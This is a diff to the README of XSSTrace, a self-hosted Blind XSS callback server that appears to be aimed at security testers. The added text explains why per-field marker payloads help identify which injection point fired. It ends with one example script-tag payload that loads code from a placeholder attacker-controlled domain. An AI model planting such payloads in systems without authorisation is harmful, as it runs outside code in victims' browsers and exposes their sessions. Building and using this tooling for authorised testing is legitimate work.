@@ -11,7 +11,7 @@ A self-hosted Blind XSS payload server and hit dashboard with unlimited markers,
 <img width="1902" height="955" alt="image" src="https://github.com/user-attachments/assets/98cf2d38-749c-4a0a-9062-d9d5cae1ad10" />
 
 ## Why This Exists
-
+[Watch the explanation here — 1:19:30 to 1:21:40](https://youtu.be/5o0Ldc8Kypg?si=3QyGhKjxDyGIKu9l&t=4770)
 Blind XSS testing is painful when your callback tooling does not give you enough control.
 
 - Burp Collaborator and Interactsh payloads are temporary or tied to a session.
@@ -19,7 +19,22 @@ Blind XSS testing is painful when your callback tooling does not give you enough
 - Classic XSS Hunter-style setups are useful, but many workflows end up with one generic payload path.
 - When testing many fields, forms, endpoints, and roles, you need to know exactly which payload fired.
 
-This project gives you your own domain and unlimited marker paths:
+The problem is simple:
+
+When you test many different fields, forms, endpoints, accounts, and roles, a generic Blind XSS callback only tells you that **something fired**. It does not always clearly tell you **which exact injection point caused the hit**.
+For example, if you test payloads in:
+
+- profile name
+- profile bio
+- support ticket
+- admin note
+- billing address
+- internal comment
+- contact form
+
+and later receive a Blind XSS callback, you need to know exactly which one triggered.
+That is the problem XSSTrace solves.
+Instead of using one generic payload path, XSSTrace lets you create unlimited marker-based payloads:
 
 ```html
 <script src="https://xss.yourdomain.com/x/signup-name"></script>
